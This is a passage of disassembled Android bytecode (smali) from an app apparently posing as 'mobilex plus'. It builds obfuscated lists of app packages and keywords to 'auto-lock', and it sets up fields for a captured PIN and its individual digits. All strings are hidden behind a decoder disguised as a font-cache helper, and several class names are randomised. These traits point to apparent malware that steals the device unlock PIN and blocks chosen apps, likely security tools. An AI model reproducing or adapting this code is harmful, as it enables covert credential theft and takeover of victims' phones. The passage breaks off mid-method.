    move-result-object v62

    .line 892
    const-string v63, "00200079005600C900FC00B000DD00AC002C0063004F"

    .line 893
    .line 894
    invoke-static/range {v63 .. v63}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 895
    .line 896
    .line 897
    move-result-object v63

    .line 898
    const-string v64, "00200079005600C900FD00BC00D300A1002600730015009100E300B200ED00A6002D00720049008800F900BB"

    .line 899
    .line 900
    invoke-static/range {v64 .. v64}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 901
    .line 902
    .line 903
    move-result-object v64

    .line 904
    const-string v65, "00200079005600C900E400AD00D700A90027007B0052008400E200B0009C00B3002E007B0048009700F500AD00C100A8002D00770057"

    .line 905
    .line 906
    invoke-static/range {v65 .. v65}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 907
    .line 908
    .line 909
    move-result-object v65

    nop

    nop

    .line 910
    const-string v66, "00200079005600C900E300B000C200AF002C00650015009400FD00AC00D700A4"

    .line 911
    .line 912
    invoke-static/range {v66 .. v66}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 913
    .line 914
    .line 915
    move-result-object v66

    .line 916
    const-string v67, "00200079005600C900F200AA00DE00AB00240063005A009500F400F100DF00A80021007F0057008200BE00B200DD00A5002A007A005E009400F500BC00C700B5002A00620042"

    .line 917
    .line 918
    invoke-static/range {v67 .. v67}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 919
    .line 920
    .line 921
    move-result-object v67

    .line 922
    const-string v68, "00200079005600C900EA00B000DC00A200310038005A008900F400AD00DD00AE00270038005A008900E400B600C400AE003100630048"

    .line 923
    .line 924
    invoke-static/range {v68 .. v68}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 925
    .line 926
    .line 927
    move-result-object v68

    .line 928
    const-string v69, "00200079005600C900F300B000DF00A8002700790015008400F900AC00DF00A2006D00770055009300F900A900DB00B500360065"

    .line 929
    .line 930
    invoke-static/range {v69 .. v69}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 931
    .line 932
    .line 933
    move-result-object v69

    .line 934
    const-string v70, "00200079005600C900E000AC00D300A1002600380056009400E500B600C600A2"

    .line 935
    .line 936
    invoke-static/range {v70 .. v70}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 937
    .line 938
    .line 939
    move-result-object v70

    .line 940
    const-string v71, "00200079005600C900F300B300D700A6002D007B005A009400E400BA00C000E9003000730058009200E200B600C600BE"

    .line 941
    .line 942
    invoke-static/range {v71 .. v71}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 943
    .line 944
    .line 945
    move-result-object v71

    .line 946
    const-string v72, "00200079005600C900E000B600C000AE002500790049008A00BE00BC00D100AB002600770055008200E2"

    .line 947
    .line 948
    invoke-static/range {v72 .. v72}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 949
    .line 950
    .line 951
    move-result-object v72

    .line 952
    const-string v73, "00200079005600C900F100B100C600AE0035007F0049009200E3"

    .line 953
    .line 954
    invoke-static/range {v73 .. v73}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 955
    .line 956
    .line 957
    move-result-object v73

    nop

    nop

    .line 958
    const-string v74, "00200079005600C900F100B100C600AE0035007F0049009200E300F100C600A60021007A005E0093"

    .line 959
    .line 960
    invoke-static/range {v74 .. v74}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 961
    .line 962
    .line 963
    move-result-object v74

    .line 964
    const-string v75, "00200079005600C900E700AC00D300A9002700640054008E00F400F100C100B2002A0062005E"

    .line 965
    .line 966
    invoke-static/range {v75 .. v75}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 967
    .line 968
    .line 969
    move-result-object v75

    .line 970
    const-string v76, "00200079005600C900E700AC00D300A9002700640054008E00F400F100C100B2002A0062005E00C900E400AD00DB00A6002F"

    .line 971
    .line 972
    invoke-static/range {v76 .. v76}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 973
    .line 974
    .line 975
    move-result-object v76

    .line 976
    const-string v77, "002C0064005C00C900F100B100C600AE0035007F0049009200E3"

    .line 977
    .line 978
    invoke-static/range {v77 .. v77}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 979
    .line 980
    .line 981
    move-result-object v77

    .line 982
    const-string v78, "00200079005600C900F300B200C100A2002000630049008E00E400A6009C00A6002D00620052009100F900AD00C700B4"

    nop

    nop

    .line 983
    .line 984
    invoke-static/range {v78 .. v78}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 985
    .line 986
    .line 987
    move-result-object v78

    .line 988
    const-string v79, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008800F400BE00D6"

    .line 989
    .line 990
    invoke-static/range {v79 .. v79}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 991
    .line 992
    .line 993
    move-result-object v79

    .line 994
    const-string v80, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008000FD00AC009C00B400360066005E009500E600B600C100AE002C0078"

    .line 995
    .line 996
    invoke-static/range {v80 .. v80}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 997
    .line 998
    .line 999
    move-result-object v80

    .line 1000
    const-string v81, "00200079005600C900FE00B000C000B3002C00780015008200FE00B800DB00A90026"

    .line 1001
    .line 1002
    invoke-static/range {v81 .. v81}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1003
    .line 1004
    .line 1005
    move-result-object v81

    .line 1006
    const-string v82, "00200079005600C900FE00B000C000B3002C00780015008A00FF00BD00DB00AB00260065005E008400E500AD00DB00B3003A"

    .line 1007
    .line 1008
    invoke-static/range {v82 .. v82}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1009
    .line 1010
    .line 1011
    move-result-object v82

    .line 1012
    const-string v83, "00200079005600C900F6008000C100A2002000630049008200BE00BE00C200B7"

    .line 1013
    .line 1014
    invoke-static/range {v83 .. v83}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1015
    .line 1016
    .line 1017
    move-result-object v83

    nop

    .line 1018
    const-string v84, "00200079005600C900F600AC00D700A400360064005E00C900F600AD00D700A2002700790056008200BE00A900C200A9"

    .line 1019
    .line 1020
    invoke-static/range {v84 .. v84}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1021
    .line 1022
    .line 1023
    move-result-object v84

    .line 1024
    const-string v85, "00200079005600C900E000BE00DC00A300220065005E008400E500AD00DB00B3003A0038004B008600FE00BB00D300A60035"

    .line 1025
    .line 1026
    invoke-static/range {v85 .. v85}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1027
    .line 1028
    .line 1029
    move-result-object v85

    .line 1030
    const-string v86, "00200079005600C900E100AA00DB00A40028007E005E008600FC00F100C200AB00220062005D008800E200B2"

    nop

    .line 1031
    .line 1032
    invoke-static/range {v86 .. v86}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1033
    .line 1034
    .line 1035
    move-result-object v86

    .line 1036
    const-string v87, "00200079005600C900E300B200DD00A5002A007A005E00C900E300BA00D100B20031007F004F009E"

    .line 1037
    .line 1038
    invoke-static/range {v87 .. v87}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1039
    .line 1040
    .line 1041
    move-result-object v87

    .line 1042
    const-string v88, "00200079005600C900E400B000C600A6002F0077004D00C900F100B100D600B5002C007F005F"

    .line 1043
    .line 1044
    invoke-static/range {v88 .. v88}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1045
    .line 1046
    .line 1047
    move-result-object v88

    .line 1048
    const-string v89, "00200079005600C900E400B000C600A6002F0072005E008100F500B100C100A2006D007B0054008500F900B300D7"

    .line 1049
    .line 1050
    invoke-static/range {v89 .. v89}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1051
    .line 1052
    .line 1053
    move-result-object v89

    .line 1054
    const-string v90, "00200079005600C900E700BA00D000B5002C0079004F00C900E300BA00D100B20031007F004F009E"

    .line 1055
    .line 1056
    invoke-static/range {v90 .. v90}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1057
    .line 1058
    .line 1059
    move-result-object v90

    .line 1060
    const-string v91, "00200079005600C900E700BA00D000B5002C0079004F00C900E300BA00D100B20031007F004F009E00F600AD00D700A2"

    nop

    .line 1061
    .line 1062
    invoke-static/range {v91 .. v91}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1063
    .line 1064
    .line 1065
    move-result-object v91

    .line 1066
    const-string v92, "00200079005600C900EA00BA00DF00A6002D00770015008A00E300BA00D100B20031007F004F009E"

    .line 1067
    .line 1068
    invoke-static/range {v92 .. v92}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1069
    .line 1070
    .line 1071
    move-result-object v92

    .line 1072
    const-string v93, "00200079005600C900F100B100DA00AB00370038005A008900E400B600C100B7003A"

    .line 1073
    .line 1074
    invoke-static/range {v93 .. v93}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1075
    .line 1076
    .line 1077
    move-result-object v93

    .line 1078
    const-string v94, "00200079005600C900E000AD00DB00B100220075004200C900F100B100C600AE003000660042008300F500AB00D700A40037"

    .line 1079
    .line 1080
    invoke-static/range {v94 .. v94}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1081
    .line 1082
    .line 1083
    move-result-object v94

    .line 1084
    const-string v95, "00200079005600C900FE00B300DE00E900200074"

    .line 1085
    .line 1086
    invoke-static/range {v95 .. v95}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1087
    .line 1088
    .line 1089
    move-result-object v95

    .line 1090
    const-string v96, "00200079005600C900FE00B300DE00E9002200750049"

    .line 1091
    .line 1092
    invoke-static/range {v96 .. v96}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1093
    .line 1094
    .line 1095
    move-result-object v96

    .line 1096
    const-string v97, "00200079005600C900FE00BA00C600B6002A00780015008600FE00AB00DB00B1002A0064004E0094"

    .line 1097
    .line 1098
    invoke-static/range {v97 .. v97}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1099
    .line 1100
    .line 1101
    move-result-object v97

    .line 1102
    const-string v98, "00200079005600C900F900B400D300B5003600650015008A00FF00BD00DB00AB002600380048008200F300AA00C000AE0037006F"

    .line 1103
    .line 1104
    invoke-static/range {v98 .. v98}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1105
    .line 1106
    .line 1107
    move-result-object v98

    .line 1108
    const-string v99, "00200079005600C900E400AD00C700B400370071005400C900FD00B000D000AE002F00730015009400F500BC00C700B5002A00620042"

    .line 1109
    .line 1110
    invoke-static/range {v99 .. v99}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1111
    .line 1112
    .line 1113
    move-result-object v99

    .line 1114
    const-string v100, "00200079005600C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C009400BE00B600DC00B30026007A0057008E00F700BA00DC00A40026"

    .line 1115
    .line 1116
    invoke-static/range {v100 .. v100}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1117
    .line 1118
    .line 1119
    move-result-object v100

    .line 1120
    const-string v101, "00200079005600C900FD00B600C700AE006D0077004B009700FD00BE00DC00A6002400730049"

    .line 1121
    .line 1122
    invoke-static/range {v101 .. v101}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1123
    .line 1124
    .line 1125
    move-result-object v101

    .line 1126
    const-string v102, "00200079005600C900FD00B600C700AE006D007E0054008A00F5"

    .line 1127
    .line 1128
    invoke-static/range {v102 .. v102}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1129
    .line 1130
    .line 1131
    move-result-object v102

    .line 1132
    const-string v103, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300B2009C00A3002600600052008400F500AC00D700A4003600640052009300E9"

    .line 1133
    .line 1134
    invoke-static/range {v103 .. v103}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1135
    .line 1136
    .line 1137
    move-result-object v103

    nop

    .line 1138
    const-string v104, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FC00B000DD00AB006D0065005E009500E600B600D100A2"

    .line 1139
    .line 1140
    invoke-static/range {v104 .. v104}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1141
    .line 1142
    .line 1143
    move-result-object v104

    .line 1144
    const-string v105, "00200079005600C900F800AA00D300B00026007F0015008600E000AF00DF00A6002D0077005C008200E2"

    .line 1145
    .line 1146
    invoke-static/range {v105 .. v105}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1147
    .line 1148
    .line 1149
    move-result-object v105

    .line 1150
    const-string v106, "00200079005600C900F300B000DE00A800310079004800C900F800BA00D300AB0037007E0058008F00F500BC00D9"

    .line 1151
    .line 1152
    invoke-static/range {v106 .. v106}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1153
    .line 1154
    .line 1155
    move-result-object v106

    .line 1156
    const-string v107, "00200079005600C900FF00AF00DE00B2003000380053008200F100B300C600AF0020007E005E008400FB"

    .line 1157
    .line 1158
    invoke-static/range {v107 .. v107}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1159
    .line 1160
    .line 1161
    move-result-object v107

    .line 1162
    const-string v108, "00200079005600C900F100A900D500E900220078005F009500FF00B600D600E9003000730058009200E200B600C600BE"

    .line 1163
    .line 1164
    invoke-static/range {v108 .. v108}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1165
    .line 1166
    .line 1167
    move-result-object v108

    .line 1168
    const-string v109, "00200079005600C900FB00BE00C100B7002600640048008C00E900F100C100A2002000630049008E00E400A6009C00A4002F0079004E0083"

    .line 1169
    .line 1170
    invoke-static/range {v109 .. v109}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1171
    .line 1172
    .line 1173
    move-result-object v109

    .line 1174
    const-string v110, "00200079005600C900F500AC00D700B3006D00730055008300E000B000DB00A90037"

    .line 1175
    .line 1176
    invoke-static/range {v110 .. v110}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1177
    .line 1178
    .line 1179
    move-result-object v110

    .line 1180
    const-string v111, "00200079005600C900F500AC00D700B3006D0066005A009500F500B100C600A6002F"

    .line 1181
    .line 1182
    invoke-static/range {v111 .. v111}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1183
    .line 1184
    .line 1185
    move-result-object v111

    .line 1186
    const-string v112, "00200079005600C900F100A900D300B400370038005A008900F400AD00DD00AE002700380058008B00F500BE00DC00A20031"

    .line 1187
    .line 1188
    invoke-static/range {v112 .. v112}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1189
    .line 1190
    .line 1191
    move-result-object v112

    .line 1192
    const-string v113, "00200079005600C900F200B600C600A300260070005E008900F400BA00C000E9002000730055009300E200BE00DE00AA0024007B004F"

    .line 1193
    .line 1194
    invoke-static/range {v113 .. v113}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1195
    .line 1196
    .line 1197
    move-result-object v113

    .line 1198
    const-string v114, "00200079005600C900F700BB00D300B3002200380056008800F200B600DE00A2003000730058009200E200B600C600BE"

    .line 1199
    .line 1200
    invoke-static/range {v114 .. v114}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1201
    .line 1202
    .line 1203
    move-result-object v114

    .line 1204
    const-string v115, "002C0064005C00C900FB00B200D300A9006D0057004A009200F1009200D300AE002F"

    .line 1205
    .line 1206
    invoke-static/range {v115 .. v115}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1207
    .line 1208
    .line 1209
    move-result-object v115

    .line 1210
    const-string v116, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9002D0074004E00C900F600B600DE00A20030"

    .line 1211
    .line 1212
    invoke-static/range {v116 .. v116}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1213
    .line 1214
    .line 1215
    move-result-object v116

    .line 1216
    filled-new-array/range {v1 .. v116}, [Ljava/lang/String;

    .line 1217
    .line 1218
    .line 1219
    move-result-object v1

    .line 1220
    invoke-static {v1}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 1221
    .line 1222
    .line 1223
    move-result-object v1

    .line 1224
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->AUTO_LOCK_PACKAGES:Ljava/util/Set;

    nop

    nop

    .line 1225
    .line 1226
    const-string v1, "003000730058009200E200B600C600BE002000730055009300F500AD"

    .line 1227
    .line 1228
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1229
    .line 1230
    .line 1231
    move-result-object v2

    nop

    nop

    .line 1232
    const-string v1, "00300077005D008200F300BA00DC00B300260064"

    .line 1233
    .line 1234
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1235
    .line 1236
    .line 1237
    move-result-object v3

    .line 1238
    const-string v1, "0030006F0048009300F500B200DF00A6002D0077005C008200E2"

    nop

    .line 1239
    .line 1240
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1241
    .line 1242
    .line 1243
    move-result-object v4

    .line 1244
    const-string v1, "003300730049008A00F900AC00C100AE002C00780056008600FE00BE00D500A20031"

    .line 1245
    .line 1246
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1247
    .line 1248
    .line 1249
    move-result-object v5

    .line 1250
    const-string v1, "0033007E0054008900F500B200D300A900220071005E0095"

    .line 1251
    .line 1252
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1253
    .line 1254
    .line 1255
    move-result-object v6

    .line 1256
    const-string v1, "00270073004D008E00F300BA00DF00A6002D0077005C008200E2"

    .line 1257
    .line 1258
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1259
    .line 1260
    .line 1261
    move-result-object v7

    .line 1262
    const-string v1, "0033007E0054008900F500B200D300B4003700730049"

    .line 1263
    .line 1264
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1265
    .line 1266
    .line 1267
    move-result-object v8

    .line 1268
    const-string v1, "00220066004B009700E200B000C600A200200062"

    .line 1269
    .line 1270
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1271
    .line 1272
    .line 1273
    move-result-object v9

    .line 1274
    const-string v1, "00220066004B008000E500BE00C000A3"

    .line 1275
    .line 1276
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1277
    .line 1278
    .line 1279
    move-result-object v10

    .line 1280
    const-string v1, "0020007A005E008600FE00BA00C0"

    .line 1281
    .line 1282
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1283
    .line 1284
    .line 1285
    move-result-object v11

    .line 1286
    const-string v1, "002100790054009400E400BA00C0"

    .line 1287
    .line 1288
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1289
    .line 1290
    .line 1291
    move-result-object v12

    .line 1292
    const-string v1, "002C0066004F008E00FD00B600C800A20031"

    .line 1293
    .line 1294
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1295
    .line 1296
    .line 1297
    move-result-object v13

    .line 1298
    const-string v1, "0025007F0057008200FD00BE00DC00A6002400730049"

    .line 1299
    .line 1300
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1301
    .line 1302
    .line 1303
    move-result-object v14

    .line 1304
    const-string v1, "0025007F0057008200F500A700C200AB002C0064005E0095"

    .line 1305
    .line 1306
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1307
    .line 1308
    .line 1309
    move-result-object v15

    .line 1310
    const-string v1, "0025007F0057008200F200AD00DD00B0003000730049"

    .line 1311
    .line 1312
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1313
    .line 1314
    .line 1315
    move-result-object v16

    .line 1316
    const-string v1, "00220078004F008E00E600B600C000B20030"

    .line 1317
    .line 1318
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1319
    .line 1320
    .line 1321
    move-result-object v17

    .line 1322
    const-string v1, "002E00770057009000F100AD00D7"

    .line 1323
    .line 1324
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1325
    .line 1326
    .line 1327
    move-result-object v18

    .line 1328
    const-string v1, "003000730058009200E200B600C600BE006D00650058008600FE"

    .line 1329
    .line 1330
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1331
    .line 1332
    .line 1333
    move-result-object v19

    .line 1334
    const-string v1, "0035007F0049009200E300F100C100A400220078"

    .line 1335
    .line 1336
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1337
    .line 1338
    .line 1339
    move-result-object v20

    .line 1340
    const-string v1, "00220066004B008A00F100AD00D900A20037"

    .line 1341
    .line 1342
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1343
    .line 1344
    .line 1345
    move-result-object v21

    nop

    .line 1346
    const-string v1, "00220066004B009400E400B000C000A2"

    .line 1347
    .line 1348
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1349
    .line 1350
    .line 1351
    move-result-object v22

    .line 1352
    const-string v1, "00220066004B00C900E300AB00DD00B50026"

    .line 1353
    .line 1354
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1355
    .line 1356
    .line 1357
    move-result-object v23

    .line 1358
    const-string v1, "002200660050008E00FE00AC00C600A6002F007A005E0095"

    .line 1359
    .line 1360
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1361
    .line 1362
    .line 1363
    move-result-object v24

    .line 1364
    const-string v1, "003300770058008C00F100B800D700AE002D0065004F008600FC00B300D700B5"

    .line 1365
    .line 1366
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1367
    .line 1368
    .line 1369
    move-result-object v25

    .line 1370
    const-string v1, "00220066004B00C900FD00BE00DC00A6002400730049"

    .line 1371
    .line 1372
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1373
    .line 1374
    .line 1375
    move-result-object v26

    .line 1376
    const-string v1, "003700770048008C00FD00BE00DC00A6002400730049"

    .line 1377
    .line 1378
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1379
    .line 1380
    .line 1381
    move-result-object v27

    .line 1382
    const-string v1, "003300640054008400F500AC00C100AA00220078005A008000F500AD"

    .line 1383
    .line 1384
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1385
    .line 1386
    .line 1387
    move-result-object v28

    .line 1388
    const-string v1, "00220066004B008E00FE00B900DD"

    .line 1389
    .line 1390
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1391
    .line 1392
    .line 1393
    move-result-object v29

    .line 1394
    const-string v1, "003000660042009000F100AD00D7"

    .line 1395
    .line 1396
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1397
    .line 1398
    .line 1399
    move-result-object v30

    .line 1400
    const-string v1, "00220078004F008E00E300AF00CB"

    .line 1401
    .line 1402
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1403
    .line 1404
    .line 1405
    move-result-object v31

    .line 1406
    const-string v1, "003300640052009100F100BC00CB00E900300075005A0089"

    .line 1407
    .line 1408
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1409
    .line 1410
    .line 1411
    move-result-object v32

    .line 1412
    filled-new-array/range {v2 .. v32}, [Ljava/lang/String;

    .line 1413
    .line 1414
    .line 1415
    move-result-object v1

    nop

    nop

    .line 1416
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->AUTO_LOCK_SUBSTRINGS:[Ljava/lang/String;

    .line 1417
    .line 1418
    new-instance v1, Landroid/os/Handler;

    nop

    nop

    .line 1419
    .line 1420
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 1421
    .line 1422
    .line 1423
    move-result-object v2

    .line 1424
    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 1425
    .line 1426
    .line 1427
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->rearmHandler:Landroid/os/Handler;

    .line 1428
    .line 1429
    const-string v1, ""

    .line 1430
    .line 1431
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPin:Ljava/lang/String;

    nop

    nop

    .line 1432
    .line 1433
    new-instance v2, Ljava/lang/StringBuilder;

    .line 1434
    .line 1435
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 1436
    .line 1437
    .line 1438
    sput-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->pinDigits:Ljava/lang/StringBuilder;

    .line 1439
    .line 1440
    const/16 v2, 0x20

    .line 1441
    .line 1442
    sput-char v2, Lapp/mobilex/plus/services/DataQFAdapter;->lastCapturedDigit:C

    .line 1443
    .line 1444
    const-string v2, "00200079005600C900F100B100D600B5002C007F005F00C900E300A600C100B30026007B004E008E"

    .line 1445
    .line 1446
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1447
    .line 1448
    .line 1449
    move-result-object v3

    .line 1450
    const-string v2, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FB00BA00CB00A00036007700490083"

    .line 1451
